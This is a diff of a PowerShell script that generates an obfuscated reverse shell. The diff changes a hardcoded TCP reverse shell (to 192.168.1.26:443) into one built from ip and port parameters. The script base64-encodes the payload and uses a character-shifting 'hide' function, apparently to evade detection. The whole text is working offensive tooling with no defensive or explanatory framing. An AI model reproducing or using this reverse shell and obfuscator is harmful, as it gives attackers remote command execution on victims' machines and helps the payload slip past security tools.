@@ -2,7 +2,7 @@ param([string]$ip,[string]$port,[int]$offset=4)
 $offset = 4
 
 $rev_shell = @'
-$x=(New-Object net.sockets.tcpclient("192.168.1.26",443)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.read($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).getbytes(((iex((New-Object -t text.asciiencoding).getstring($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
+$x=(New-Object net.sockets.tcpclient("~",!)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.read($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).getbytes(((iex((New-Object -t text.asciiencoding).getstring($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
 '@ -replace '~',$ip -replace '!',$port
 
 $b64 = [convert]::ToBase64String([text.encoding]::ASCII.GetBytes($rev_shell))
@@ -20,7 +20,6 @@ $fix = @'
 function hide{
     param([string]$plaintext)
     (($plaintext-split''|%{[int][char]$_+$offset}|%{[char]$_})-join'' -replace '`','``' -replace "'",$fix) -replace "^",$start -replace '$',$end -replace 'johnxor','_'
-
 }
 
 $strings = $strings|%{hide($_)}
